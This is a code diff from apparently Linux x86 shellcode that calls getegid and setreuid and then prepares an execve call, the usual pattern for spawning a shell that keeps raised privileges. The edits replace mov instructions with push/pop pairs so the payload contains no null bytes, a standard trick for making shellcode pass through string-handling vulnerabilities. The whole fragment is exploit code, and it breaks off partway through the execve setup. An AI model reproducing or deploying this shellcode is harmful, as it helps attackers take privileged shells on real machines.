@@ -4,12 +4,14 @@ global _start
 section .text
 
 _start:
-    mov eax, 0x32   ; getegid
+    push 0x32
+    pop eax         ; getegid, no null byte
     syscall
 
     mov ebx, eax    ; setreuid arg0
     mov ecx, eax    ; setreuid arg1
-    mov eax, 0x46   ; setreuid
+    push 0x46
+    pop eax         ; setreuid, no null byte
     syscall
     
     lea ebx, [esp]  ; execve arg0 (pointer to argv[0])
